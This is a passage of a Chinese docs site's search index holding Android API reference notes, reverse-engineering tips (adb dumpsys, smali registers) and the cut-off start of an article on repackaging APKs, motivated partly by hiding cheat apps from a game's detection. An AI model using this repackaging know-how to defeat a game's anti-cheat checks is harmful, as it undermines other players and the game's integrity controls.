\u83b7\u53d6\u6587\u4ef6\u4fdd\u5b58\u76ee\u5f55\u3000\u3000\u3000\u3000\u3000\u3000 getCacheDir(): \u83b7\u53d6\u7f13\u5b58\u76ee\u5f55\u3000\u3000\u3000\u3000\u3000\u3000 openFileOutput(String, int): \u62ff\u5230File\u76ee\u5f55\u6587\u4ef6\u7684\u8f93\u51fa\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 openFileInput(String, int): \u62ff\u5230File\u76ee\u5f55\u6587\u4ef6\u7684\u8f93\u5165\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 runOnUiThread(Runnable): \u53ef\u5728\u5b50\u7ebf\u7a0b\u4e2d\u8c03\u7528\uff0c\u5b8c\u6210\u66f4\u65b0ui\u64cd\u4f5c\u3000\u3000\u3000\u3000 \u751f\u547d\u5468\u671f\u65b9\u6cd5: onCreate(),onStart(),onResume(),onPause(),onRestart(),onStop(),onDestory()\u3000\u3000\u3000\u3000 BroadcastReceiver: \u5e7f\u64ad\u63a5\u6536\u8005,\u53ef\u76d1\u542c\u624b\u673a\u7684\u72b6\u6001\u3000\u3000 onReceive(Context, Intent): \u5f53\u63a5\u6536\u5230\u4e8b\u4ef6\u65f6\u8c03\u7528\uff0c\u76d1\u542c\u7684\u4e8b\u4ef6\u5728\u6e05\u5355\u6587\u4ef6\u4e2d\u914d\u7f6e\u3000\u3000\u3000\u3000 Intent.getAction(): \u83b7\u53d6\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000\u3000\u3000\u3000\u3000 Service: \u670d\u52a1\u3000\u3000 onBind(): \u5f53\u7ed1\u5b9a\u670d\u52a1\u65f6\u8c03\u7528,\u4f7f\u7528\u8fd4\u56de\u7684\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u670d\u52a1\u4e2d\u7684\u5bf9\u8c61\u3000\u3000\u3000\u3000 onCreate(): \u7b2c\u4e00\u6b21\u521b\u5efa\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 onStartCommand(..): \u6bcf\u6b21start\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 onDestroy(): \u505c\u6b62\u670d\u52a1\u65f6\u8c03\u7528\u3000\u3000\u3000\u3000 ContentProvider\uff1a\u5185\u5bb9\u63d0\u4f9b\u8005\uff0c\u53ef\u4ee5\u8ba9\u5176\u4ed6\u5e94\u7528\u8bbf\u95ee\u81ea\u5df1\u7684\u6570\u636e\u5e93\u3000\u3000 UriMatcher\uff1a\u5339\u914duri\u7684\u7c7b\u3000\u3000\u3000\u3000 new UriMatcher(UriMatcher.NO_MATCH)\uff1a \u521b\u5efa\u3000\u3000\u3000\u3000\u3000\u3000 UriMatcher.addURI(String authorities, String path, int): \u6dfb\u52a0\u5339\u914d\u8def\u5f84\uff0c\u5728\u6570\u636e\u5e93\u64cd\u4f5c\u65b9\u6cd5\u4e2d\u4f7f\u7528UriMatcher.match(uri)\u65b9\u6cd5\u8fdb\u884c\u8fd4\u56de\u7801\u5224\u65ad\u8def\u5f84\u3000\u3000\u3000\u3000\u3000\u3000 authorities: \u6e05\u5355\u6587\u4ef6\u4e2d\u7684authorities\u5c5e\u6027\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 path: \u8bf7\u6c42\u8def\u5f84\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 int: \u8bf7\u6c42\u7801\u3000\u3000\u3000\u3000\u3000\u3000\u3000\u3000 R: \u5e94\u7528\u7684\u8d44\u6e90\u7c7b\u3000\u3000 R.drawable: \u5305\u542b\u6240\u6709\u56fe\u7247\u8d44\u6e90\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.layout: \u5305\u542b\u6240\u6709\u5e03\u5c40\u8d44\u6e90\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.id: \u5305\u542b\u6240\u6709\u89c6\u56feid\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 R.string: \u5305\u542b\u6240\u6709\u5b57\u7b26\u4e32\u6807\u8bc6\u7684\u5185\u90e8\u7c7b\u3000\u3000 Intent: Activity, Service\u548cBroadcastReceiver\u8fd9\u4e09\u4e2a\u5e94\u7528\u7ec4\u4ef6\u4e4b\u95f4\u8fdb\u884c\u901a\u4fe1\u7684\u4fe1\u4f7f Intent(Context context, Class clazz): \u660e\u786e\u6307\u5b9a\u7684\u76ee\u6807\u7ec4\u4ef6\u7684\u610f\u56fe,\u5f53\u64cd\u4f5c\u5f53\u524d\u81ea\u5df1\u5e94\u7528\u7684\u7ec4\u4ef6\u65f6\u4f7f\u7528\u3000\u3000 Intent(String action): \u6ca1\u6709\u660e\u786e\u6307\u5b9a\u76ee\u6807\u7ec4\u4ef6\u7684\u610f\u56fe,\u5f53\u64cd\u4f5c\u5176\u5b83\u5e94\u7528\u7684\u7ec4\u4ef6\u65f6\u4f7f\u7528\u3000\u3000 action: \u4e3aActivity\u914d\u7f6e\u4e2d\u7684 \u6807\u7b7e\u4e2d \u6807\u7b7e\u7684android:name\u5c5e\u6027\u3000\u3000\u3000\u3000 Intent.ACTION_DIAL: \u8fdb\u5165\u7535\u8bdd\u62e8\u6253\u754c\u9762\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 Intent.ACTION_SENDTO: \u8fdb\u5165\u77ed\u4fe1\u7f16\u8f91\u754c\u9762\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 Intent.ACTION_CALL: \u62e8\u6253\u7535\u8bdd\u7684\u610f\u56fe\u3000\u3000\u3000\u3000\u3000\u3000 putExtra(String name, Xxx value): \u4fdd\u5b58\u989d\u5916\u6570\u636e\u3000\u3000 Xxx getXxxExtra(String name): \u83b7\u53d6\u989d\u5916\u6570\u636e\u3000\u3000 setData(Uri data): \u8bbe\u7f6e\u6709\u7279\u5b9a\u683c\u5f0f\u7684uri\u6570\u636e\u3000\u3000 View: \u6240\u6709\u89c6\u56fe\u7684\u6839\u57fa\u7c7b setonClickListener(OnClickListener listener): \u7ed9\u89c6\u56fe\u8bbe\u7f6e\u70b9\u51fb\u76d1\u542c\u3000\u3000 setOnLongClickListener(OnLongListener listener): \u8bbe\u7f6e\u957f\u6309\u76d1\u542c\u3000\u3000 void setVisibility(int visibility): \u8bbe\u7f6e\u8bd5\u56fe\u7684\u53ef\u89c1\u6027\u3000\u3000 visibility:\u3000\u3000\u3000\u3000 View.VISIBLE: \u53ef\u89c1\u3000\u3000\u3000\u3000\u3000\u3000 View.INVISIBLE: \u4e0d\u53ef\u89c1\uff0c\u4f46\u5360\u7528\u5c4f\u5e55\u7a7a\u95f4\u3000\u3000\u3000\u3000\u3000\u3000 View.GONE: \u4e0d\u53ef\u89c1\uff0c\u4e5f\u4e0d\u5360\u7528\u5c4f\u5e55\u7a7a\u95f4\u3000\u3000\u3000\u3000\u3000\u3000 static View inflate(Context context, int resource, ViewGroup root): \u52a8\u6001\u52a0\u8f7d\u5e03\u5c40\u6587\u4ef6\u3000\u3000 \u52a8\u6001\u52a0\u8f7d\u5e03\u5c40\u6587\u4ef6\u7684\u5176\u4ed6\u4e24\u79cd\u65b9\u6cd5\u3000\u3000\u3000\u3000 LayoutInflater.from(Context).inflate(int, ViewGroup);\u3000\u3000\u3000\u3000\u3000\u3000 LayoutInflater inflater = getSystemService(LAYOUT_INFLATER_SERVICE); inflater.inflater(int, ViewGroup);\u3000\u3000\u3000\u3000\u3000\u3000 Toast: \u7528\u6765\u663e\u793a\u77ed\u65f6\u95f4\u63d0\u793a\u6587\u672c\u7684\u7c7b static Toast makeText(Context context, CharSequence text, int duration) : \u521b\u5efa\u4e00\u4e2atoast\u5bf9\u8c61\u3000\u3000 context: \u53ef\u4ee5\u4f20\u5165Activity\u7c7b\u3000\u3000\u3000\u3000 text: \u663e\u793a\u7684\u6587\u672c\u3000\u3000\u3000\u3000 duration: \u6301\u7eed\u7684\u65f6\u95f4(LENGTH_SHORT\u6216LENGTH_LONG)\u3000\u3000\u3000\u3000 show(): \u663e\u793a\u63d0\u793a\u3000\u3000 AlertDialog: \u663e\u793a\u5728\u5c4f\u5e55\u4e0a\u7684\u5c0f\u5bf9\u8bdd\u6846 show(): \u663e\u793a\u3000\u3000 AlertDialog.Builder: AlertDialog\u5185\u90e8\u7c7b\uff0c\u7528\u6765\u521b\u5efaAlertDialog\u3000\u3000 create(): \u521b\u5efaAlertDialog\u5bf9\u8c61\u3000\u3000\u3000\u3000 show(): \u521b\u5efaalertDialog\u5bf9\u8c61\uff0c\u540c\u65f6\u5c06\u5176\u663e\u793a\u51fa\u6765\u3000\u3000\u3000\u3000 setTitle(CharSequence): \u8bbe\u7f6e\u6807\u9898\u3000\u3000\u3000\u3000 setMessage(CharSequence): \u8bbe\u7f6e\u5185\u5bb9\u3000\u3000\u3000\u3000 setPositiveButton(String, OnClickListener): \u8bbe\u7f6e\u6b63\u9762\u6309\u94ae\u3000\u3000\u3000\u3000 setNegativeButton(String, OnClickListener): \u8bbe\u7f6e\u8d1f\u9762\u6309\u94ae\u3000\u3000\u3000\u3000 dismiss(): \u79fb\u9664dialog\u3000\u3000\u3000\u3000 setView(View): \u8bbe\u7f6edialog\u4e2d\u7684\u5e03\u5c40\u3000\u3000\u3000\u3000 setSingleChoiceItems(CharSequence[], int, OnClickListener): \u8bbe\u7f6e\u5355\u9009\u5217\u8868\u3000\u3000\u3000\u3000 setMultiChoiceItems(...): \u8bbe\u7f6e\u591a\u9009\u5217\u8868\u3000\u3000\u3000\u3000 ProgressDialog: \u8fdb\u5ea6\u6846\u3000\u3000 show(Context, CharSequence, CharSequence): \u50cf\u662fdialog\u3000\u3000 setProgressStyle(int style): \u8bbe\u7f6e\u6837\u5f0f\u3000\u3000 style: \u6837\u5f0f\uff0c\u9ed8\u8ba4\u5706\u5f62\u8fdb\u5ea6\u3000\u3000\u3000\u3000 ProgressDialog.STYLE_HORIZONTAL: \u6c34\u5e73\u8fdb\u5ea6\u6761\u6837\u5f0f\u3000\u3000\u3000\u3000\u3000\u3000 dismiss(): \u79fb\u9664dialog\u3000\u3000 SmsManager: \u53d1\u9001\u77ed\u4fe1\u7684\u5de5\u5177\u7c7b static SmsManager getDefault() : \u5f97\u5230\u5f53\u524d\u5bf9\u8c61\u3000\u3000 sendTextMessage(String destinationAddress, String scAddress, String text, PendingIntent sentIntent, PendingIntent deliveryIntent): \u53d1\u9001\u77ed\u4fe1\u3000\u3000 destinationAddress\uff1a\u7535\u8bdd\u53f7\u7801\u3000\u3000\u3000\u3000 scAddress\uff1a\u670d\u52a1\u4e2d\u5fc3\u7684\u5730\u5740\uff0c\u4e00\u822c\u586bnull\u3000\u3000\u3000\u3000 text\uff1a\u4fe1\u606f\u5185\u5bb9\u3000\u3000\u3000\u3000 sentIntent\u3000\u3000\u3000\u3000 deliveryIntent\u3000\u3000\u3000\u3000 SharedPreferences: \u7528\u4e8e\u4fdd\u5b58\u6570\u636e\u7684\u7c7b Activity.getSharedPreferences(String, int): \u62ff\u5230SharedPreferences\u3000\u3000 Editor edit(): \u62ff\u5230\u7f16\u8f91\u5668\u3000\u3000 Editor:\u3000\u3000\u3000\u3000 putXxx(...): \u5411\u7f16\u8f91\u5668\u4e2d\u653e\u6570\u636e\u3000\u3000\u3000\u3000\u3000\u3000 getXxx(...): \u53d6\u51fa\u6570\u636e\u3000\u3000 commit(): \u63d0\u4ea4\u6570\u636e\uff0c\u4fdd\u5b58\u6570\u636e\u3000\u3000 OptionMenu: \u5e95\u90e8\u83dc\u5355 \u5728activity\u4e2d\u91cd\u5199onCreateOptionsMenu\u65b9\u6cd5\uff0c\u5373\u53ef\u5b9a\u4e49\u5e95\u90e8\u83dc\u5355\u3000\u3000 \u5411menu\u4e2d\u6dfb\u52a0menultem\u7684\u65b9\u5f0f\u3000\u3000 \u8c03\u7528menu.add(...)\u65b9\u6cd5\u3000\u3000\u3000\u3000 \u52a0\u8f7dmenu\u6587\u4ef6\u3000\u3000\u3000\u3000 getMenulnflater().inflate(R.menu.main_option, menu);\u3000\u3000\u3000\u3000\u3000\u3000 \u91cd\u5199onOptionsItemSelected\u65b9\u6cd5\uff0c\u8fdb\u884c\u76f8\u5e94\u3000\u3000 ContextMenu: \u4e0a\u4e0b\u6587\u83dc\u5355 setOnCreateContextMenuListener(listener)\uff1a\u4e3a\u67d0\u4e2a\u89c6\u56fe\u6dfb\u52a0\u521b\u5efaContextMenu\u7684\u76d1\u542c(\u9700\u8981\u957f\u6309\u89e6\u53d1)\u3000\u3000 onCreateContextMenu(menu, view, menuInfo)\uff1a\u5b9a\u4e49\u4e0a\u4e0b\u6587\u83dc\u5355\u3000\u3000 \u5411menu\u4e2d\u6dfb\u52a0menultem\u7684\u65b9\u5f0f\uff0c\u540c\u4e0a\u3000\u3000\u3000\u3000 onContextItemSelected(MenuItem item)\u5f53\u9009\u62e9\u67d0\u4e2a\u83dc\u5355\u9879\u7684\u56de\u8c03\u65b9\u6cd5 XmlSerializer: \u5199xml\u6587\u4ef6\u7c7b\uff0c\u4f7f\u7528Xml\u7c7b\u62ff\u5230 setOutput(OutputStream, String): \u6307\u5b9a\u8f93\u51fa\u6d41\u53ca\u7f16\u7801\u3000\u3000 startDocument(String, Boolean): \u5199xml\u6587\u4ef6\u7684\u5f00\u5934\u3000\u3000 endDocument(): \u5199xml\u6587\u4ef6\u7684\u7ed3\u5c3e\u3000\u3000 startTag(String, String): \u5199\u8282\u70b9\u3000\u3000 endTag(String, String): \u7ed3\u675f\u8282\u70b9\u3000\u3000 text(String): \u5199\u6807\u7b7e\u4f53\u3000\u3000 XmlPullParser: \u8bfbxml\u6587\u4ef6\uff0c\u4f7f\u7528Xml\u7c7b\u62ff\u5230 setInput(InputStream, String): \u6307\u5b9a\u8f93\u5165\u6d41\u53ca\u7f16\u7801\u3000\u3000 getEventType(): \u62ff\u5230\u5f53\u524d\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000 START_TAG\uff1b\u5f00\u59cb\u6807\u7b7e\u3000\u3000\u3000\u3000 TEXT: \u6587\u672c\u5185\u5bb9\u3000\u3000\u3000\u3000 END_TAG: \u7ed3\u675f\u6807\u7b7e\u3000\u3000\u3000\u3000 END_DOCUMENT: \u6587\u4ef6\u7ed3\u5c3e\u3000\u3000\u3000\u3000 next(): \u5411\u540e\u79fb\u52a8\uff0c\u5e76\u8fd4\u56de\u79fb\u52a8\u540e\u7684\u4e8b\u4ef6\u7c7b\u578b\u3000\u3000 getName(): \u62ff\u5230\u5f53\u524d\u7684\u5f00\u59cb\u6807\u7b7e\u6216\u7ed3\u675f\u6807\u7b7e\u7684\u540d\u5b57\u3000\u3000 getAttributeValue(int): \u62ff\u5230\u5c5e\u6027\u503c\u3000\u3000 nextText(): \u5f53\u524d\u4e3a\u5f00\u59cb\u6807\u7b7e\u65f6\uff0c\u62ff\u5230\u6807\u7b7e\u4f53\u5185\u5bb9\u3000\u3000 Xml\uff1axml\u6587\u4ef6\u6709\u5173\u7684\u5de5\u5177\u7c7b newSerializer(): \u65b0\u5efa\u4e00\u4e2aXmlSerializer\u7c7b\u3000\u3000 newPullParser(): \u65b0\u5efa\u4e00\u4e2aXmlPullParser\u7c7b\u3000\u3000 SQLiteOpenHelper\uff1a\u4f7f\u7528\u6570\u636e\u5e93\u4f7f\u7528\u7684\u7c7b\uff0c\u62bd\u8c61\u7c7b\uff0c\u9700\u81ea\u5df1\u5b9e\u73b0\uff0c\u6570\u636e\u5e93\u4ee5db\u4e3a\u540e\u7f00 SQLiteOpenHelper(Context, String, CursorFactory, int): \u6784\u9020\u5668\uff0c\u53c2\u6570(\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u6570\u636e\u5e93\u540d\u79f0\uff0cnull,\u7248\u672c)\u3000\u3000 onCreate(SQLiteDatabase): \u9700\u91cd\u5199\uff0c\u5f53\u6570\u636e\u5e93\u521b\u5efa\u65f6\u8c03\u7528(\u521b\u5efa\u8868)\u3000\u3000 onUpgrade(SQLiteDatabase, int, int):\u9700\u91cd\u5199\uff0c\u5f53\u6570\u636e\u5e93\u7248\u672c\u5347\u7ea7\u65f6\u8c03\u7528\u3000\u3000 getWritableDatabase(): \u62ff\u5230SQLiteDatabase\u5bf9\u8c61\u3000\u3000 getReadableDatabase(): \u62ff\u5230SQLiteDatabase\u5bf9\u8c61\uff0c\u5f53\u78c1\u76d8\u6ee1\u4e86\uff0c\u8fd4\u56de\u53ea\u8bfb\u7684 SQLiteDatabase: \u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\u7684\u7c7b execSQL(String, [Object[]]): \u6267\u884csql\u8bed\u53e5\uff0csql\u8bed\u53e5\u6709\u5360\u4f4d\u7b26\u65f6\u4f7f\u7528obj\u6570\u7ec4\u3000\u3000 rawQuery(String, String[]): \u4f7f\u7528sql\u8bed\u53e5\u67e5\u8be2\uff0c\u8fd4\u56deCursor\u7ed3\u679c\u96c6\u3000\u3000 insert(String, String, ContentValues): \u5411\u6570\u636e\u5e93\u6dfb\u52a0\u7eaa\u5f55(\u8868\u540d\uff0cnull\uff0cmap)\u3000\u3000 delete(String, String, String[]): \u5220\u9664\u6570\u636e(\u8868\u540d\uff0c\u6761\u4ef6\uff0c\u5360\u4f4d\u7b26)\u3000\u3000 update(String, ContentValues, String, String[]): \u66f4\u65b0\u6570\u636e(\u8868\u540d\uff0cmap\uff0c\u6761\u4ef6\uff0c\u5360\u4f4d\u7b26)\u3000\u3000 query(...): \u67e5\u8be2\u6570\u636e\u5e93\uff0c\u8fd4\u56deCursor\u5bf9\u8c61\u3000\u3000 close(): \u5173\u95ed\u6570\u636e\u5e93\u3000\u3000 beginTransaction(): \u5f00\u542f\u4e8b\u52a1\u3000\u3000 endTransaction(): \u5173\u95ed\u4e8b\u52a1\u3000\u3000 setTransactionSuccessful(): \u8bbe\u7f6e\u4e8b\u52a1\u6210\u529f\uff0c\u5373\u63d0\u4ea4\u4e8b\u52a1\u3000\u3000 Cursor: \u6570\u636e\u5e93\u67e5\u8be2\u7684\u7ed3\u679c\u96c6 getCount(): \u8fd4\u56de\u7ed3\u679c\u6570\u3000\u3000 getColunCount(): \u8fd4\u56de\u7ed3\u679c\u5217\u6570\u3000\u3000 getColumnNames(): \u8fd4\u56de\u5217\u540d\u7684\u6570\u7ec4\u3000\u3000 getXxx(int): \u62ff\u5230\u5f53\u524d\u884c\u7684\u5bf9\u5e94\u5217\u7684\u503c(0\u5f00\u59cb)\u3000\u3000 moveToFirst(): \u79fb\u52a8\u5230\u7b2c\u4e00\u4e2a\u7ed3\u679c\u3000\u3000 moveToLast(): \u79fb\u52a8\u5230\u6700\u540e\u4e00\u4e2a\u3000\u3000 moveToNext(): \u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u3000\u3000 close(): \u5173\u95ed\u3000\u3000 ArrayAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c\u53ea\u80fd\u6dfb\u52a0\u4e00\u4e2a\u7ec4\u4ef6 SimpleAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u7ec4\u4ef6\uff0c\u8017\u5185\u5b58 SimpleAdapter(Context, List >, int, String[], int[]): \u53c2\u6570(\u4e0a\u4e0b\u6587\u5bf9\u8c61\uff0c\u9700\u8981\u663e\u793a\u7684\u6570\u636eList\uff0c\u5e03\u5c40\u6587\u4ef6\u6807\u8bc6\uff0cmap\u7684key\u7684\u6570\u7ec4\uff0c\u5e03\u5c40\u6587\u4ef6\u4e2d\u5b50View\u7684id\u6570\u7ec4)\u3000\u3000 BaseAdapter: ListAdapter\u5b50\u7c7b\uff0c\u5411ListView\u4e2d\u6dfb\u52a0\u9879\uff0c \u62bd\u8c61\u7c7b\uff0c\u9700\u81ea\u5df1\u5b9e\u73b0\uff0cArrayAdapter\u548cSimpleAdapter\u5747\u662f\u5176\u5b9e\u73b0\u7c7b\u3000\u3000 getCount(): \u8fd4\u56de\u96c6\u5408\u6570\u636e\u7684\u6570\u91cf\u3000\u3000 getItem(int): \u8fd4\u56de\u6307\u5b9a\u4e0b\u6807\u5bf9\u5e94\u7684\u6570\u636e\u5bf9\u8c61\u3000\u3000 getView(int, View, ViewGroup): \u8fd4\u56de\u6307\u5b9a\u4e0b\u6807item\u7684View\u5bf9\u8c61\u3000\u3000 HttpURLConnection: \u4f7f\u7528Http\u534f\u8bae\u53d1\u9001\u548c\u63a5\u6536\u6570\u636e \u4f7f\u7528URL\u7c7b\u521b\u5efa\u3000\u3000 setConnectTimeout(int): \u8bbe\u7f6e\u94fe\u63a5\u7684\u8d85\u65f6\u65f6\u95f4\u3000\u3000 setRequestMethod(String): \u8bbe\u7f6e\u8bf7\u6c42\u7c7b\u578b\u3000\u3000 setRequestProperty(String, String): \u8bbe\u7f6e\u8bf7\u6c42\u5934\u4fe1\u606f\u3000\u3000 Post\u63d0\u4ea4\u65f6\u9700\u8981\u8bbe\u7f6e\"Content-Type\"\u548cContent-Length\"\u5934\u4fe1\u606f\u3000\u3000\u3000\u3000\u3000\u3000 setDoOupput(boolean): \u8bbe\u7f6e\u5141\u8bb8\u8f93\u51fa\u64cd\u4f5c\uff0c\u5728post\u8bf7\u6c42\u65f6\u4f7f\u7528\u3000\u3000 getOupputStream(): \u62ff\u5230\u8f93\u51fa\u6d41\uff0c\u5728post\u8bf7\u6c42\u65f6\u5199\u5165\u8bf7\u6c42\u4f53\u3000\u3000 getResponseCode(): \u83b7\u53d6\u54cd\u5e94\u7801\u3000\u3000 getInputStream(): \u83b7\u53d6\u670d\u52a1\u5668\u54cd\u5e94\u4fe1\u606f\u7684\u8f93\u5165\u6d41 HttpClient: \u5b89\u5353\u63d0\u4f9b\u7684\u8054\u7f51\u7c7b \u5b9e\u73b0\u7c7b: DefaultHttpClient...\u3000\u3000 execute(HttpUriRequest): \u6267\u884curl\u8bf7\u6c42\uff0c\u8fd4\u56deHttpResponse\u5bf9\u8c61\u3000\u3000 HttpUriRequest\u3000\u3000\u3000\u3000 \u5b9e\u73b0\u7c7b: HttpGet, HttpPost...\u3000\u3000\u3000\u3000\u3000\u3000 HttpResponse:\u3000\u3000\u3000\u3000 getStatusLine().getStatusCode(): \u83b7\u53d6\u54cd\u5e94\u7801\u3000\u3000\u3000\u3000\u3000\u3000 getEntity().getContent(): \u83b7\u53d6\u76f8\u5e94\u6d41\u3000\u3000\u3000\u3000\u3000\u3000 URL: URL(String): \u4f7f\u7528\u6307\u5b9a\u8def\u5f84\u521b\u5efaURL\u5bf9\u8c61\u3000\u3000 openConnection(): \u6253\u5f00\u94fe\u63a5\uff0c\u5f97\u5230URLConnection\u5bf9\u8c61\u3000\u3000 Handler: \u53ef\u4ee5\u6267\u884c\u66f4\u65b0ui\u64cd\u4f5c\u7684\u7ebf\u7a0b \u5728\u5206\u7ebf\u7a0b\u4e2d\u8c03\u7528handler.sendMessage(Message),\u8fdb\u884c\u66f4\u65b0ui\u64cd\u4f5c\u3000\u3000 handleMessage(Message): \u9700\u91cd\u5199\uff0c\u5f53sendMessage()\u8c03\u7528\u65f6\u6267\u884c\u6b64\u65b9\u6cd5\u3000\u3000 postDelayed(Runnable, int): \u5728\u6307\u5b9a\u65f6\u95f4\u540e\u6267\u884c\u64cd\u4f5c","title":"JavaAndroid\u5f00\u53d1\u90e8\u5206API"},{"location":"Android/android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/","text":"\u83b7\u53d6\u5f53\u524d\u9875\u9762\u7684\u4fe1\u606f \u00b6 \u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u9875\u9762\u6240\u5728\u7684 smail \u6587\u4ef6\u7b49\u4fe1\u606f [collapse title=\"\u5c55\u5f00\u67e5\u770b\u8be6\u60c5\" status=\"false\"] adb \u547d\u4ee4\uff1a adb shell dumpsys activity top \u8f93\u5165\u6837\u5f0f\uff1a >adb shell dumpsys activity top TASK com.v2ray.ang id = 55527 userId = 0 ACTIVITY com.v2ray.ang/.ui.MainActivity e6fdfe pid = 3052 Local Activity 49dce53 State: mResumed = false mStopped = true mFinished = false mChangingConfigurations = false mCurrentConfig ={ 1 .0 0 460mcc1mnc [ zh_CN,en_US ] dumpsys \u547d\u4ee4\u7528\u4e8e\u83b7\u53d6\u8be6\u5c3d\u7684\u7cfb\u7edf\u4fe1\u606f\uff0c\u901a\u5e38\u5728\u540e\u9762\u642d\u914d\u53c2\u6570\u53ea\u8f93\u51fa\u90e8\u5206\u4fe1\u606f\uff0c\u5982\uff1a\u5c4f\u5e55\u8f93\u5165\u503c\u3001\u7535\u6e90\u3001\u5185\u5b58\u7b49\uff0c\u8be6\u7ec6\u4f7f\u7528\u624b\u518c\u53ef\u4ee5\u5230 \u5b89\u5353\u5f00\u53d1\u8005\u5e73\u53f0 \u67e5\u770b\u3002 [/collapse] \u6253\u5f00/\u5173\u95ed\u9875\u9762\u6267\u884c\u51fd\u6570 \u00b6 \u5e7f\u544a\u6253\u5f00/\u5173\u95ed\u9875\u9762\u65f6\u5f39\u51fa\uff0c\u6216\u8005\u6253\u5f00/\u5173\u95ed APP \u65f6\u5f39\u51fa\uff0c\u53ef\u80fd\u4e0e onCreat / onDestroy \u51fd\u6570\u6709\u5173\u3002 smail \u4ee3\u7801 \u00b6 [collapse title=\"\u5c55\u5f00\u67e5\u770b\u8be6\u60c5\" status=\"false\"] \u65b9\u6cd5\u4e0b\u9762\u7684 .locals n \u8868\u793a\u65b9\u5f0f\u5c40\u90e8\u4f7f\u7528 n \u4e2a\u5bc4\u5b58\u5668 pn \u4ee3\u8868\u65b9\u6cd5\u4f20\u5165\u7684\u7b2c n \u4e2a\u53c2\u6570 vn \u4ee3\u8868\u4f7f\u7528\u7b2c n \u4e2a\u5bc4\u5b58\u5668 [/collapse]","title":"Android\u9006\u5411\u8c03\u8bd5\u6280\u5de7"},{"location":"Android/android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/#_1","text":"\u53ef\u4ee5\u83b7\u53d6\u5f53\u524d\u9875\u9762\u6240\u5728\u7684 smail \u6587\u4ef6\u7b49\u4fe1\u606f [collapse title=\"\u5c55\u5f00\u67e5\u770b\u8be6\u60c5\" status=\"false\"] adb \u547d\u4ee4\uff1a adb shell dumpsys activity top \u8f93\u5165\u6837\u5f0f\uff1a >adb shell dumpsys activity top TASK com.v2ray.ang id = 55527 userId = 0 ACTIVITY com.v2ray.ang/.ui.MainActivity e6fdfe pid = 3052 Local Activity 49dce53 State: mResumed = false mStopped = true mFinished = false mChangingConfigurations = false mCurrentConfig ={ 1 .0 0 460mcc1mnc [ zh_CN,en_US ] dumpsys \u547d\u4ee4\u7528\u4e8e\u83b7\u53d6\u8be6\u5c3d\u7684\u7cfb\u7edf\u4fe1\u606f\uff0c\u901a\u5e38\u5728\u540e\u9762\u642d\u914d\u53c2\u6570\u53ea\u8f93\u51fa\u90e8\u5206\u4fe1\u606f\uff0c\u5982\uff1a\u5c4f\u5e55\u8f93\u5165\u503c\u3001\u7535\u6e90\u3001\u5185\u5b58\u7b49\uff0c\u8be6\u7ec6\u4f7f\u7528\u624b\u518c\u53ef\u4ee5\u5230 \u5b89\u5353\u5f00\u53d1\u8005\u5e73\u53f0 \u67e5\u770b\u3002 [/collapse]","title":"\u83b7\u53d6\u5f53\u524d\u9875\u9762\u7684\u4fe1\u606f"},{"location":"Android/android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/#_2","text":"\u5e7f\u544a\u6253\u5f00/\u5173\u95ed\u9875\u9762\u65f6\u5f39\u51fa\uff0c\u6216\u8005\u6253\u5f00/\u5173\u95ed APP \u65f6\u5f39\u51fa\uff0c\u53ef\u80fd\u4e0e onCreat / onDestroy \u51fd\u6570\u6709\u5173\u3002","title":"\u6253\u5f00/\u5173\u95ed\u9875\u9762\u6267\u884c\u51fd\u6570"},{"location":"Android/android%E9%80%86%E5%90%91%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/#smail","text":"[collapse title=\"\u5c55\u5f00\u67e5\u770b\u8be6\u60c5\" status=\"false\"] \u65b9\u6cd5\u4e0b\u9762\u7684 .locals n \u8868\u793a\u65b9\u5f0f\u5c40\u90e8\u4f7f\u7528 n \u4e2a\u5bc4\u5b58\u5668 pn \u4ee3\u8868\u65b9\u6cd5\u4f20\u5165\u7684\u7b2c n \u4e2a\u53c2\u6570 vn \u4ee3\u8868\u4f7f\u7528\u7b2c n \u4e2a\u5bc4\u5b58\u5668 [/collapse]","title":"smail \u4ee3\u7801"},{"location":"Android/apk%E4%BF%AE%E6%94%B9%E5%8C%85%E5%90%8D%E3%80%81%E5%90%8D%E7%A7%B0%E3%80%81%E5%9B%BE%E6%A0%87/","text":"\u524d\u8a00 \u00b6 \u4e0d\u4e3a\u4eba\u77e5\u7684\u67d0\u6e38\u620f APP \u4f1a\u5bf9\u624b\u673a\u68c0\u67e5\u662f\u5426\u6709\u4f5c\u5f0a APP \uff0c\u4e5f\u5c31\u662f\u68c0\u6d4b\u624b\u673a\u4e0a APP \u7684\u5305\u540d\u561b\u3002\u5728\u5176\u6b21 wx \u6ca1\u6709\u7c7b\u4f3c qq \u7684\u5173\u8054\u529f\u80fd\uff0c\u53cc\u53f7\u7528\u6237\u5dee\u8bc4\u3002 \u56e0\u4e3a\u8fdb\u884c\u4e86\u53cd\u7f16\u8bd1\u548c\u56de\u7f16\u8bd1\uff0c\u6240\u4ee5 apk \u7b7e\u540d\u4f1a\u6539\u53d8 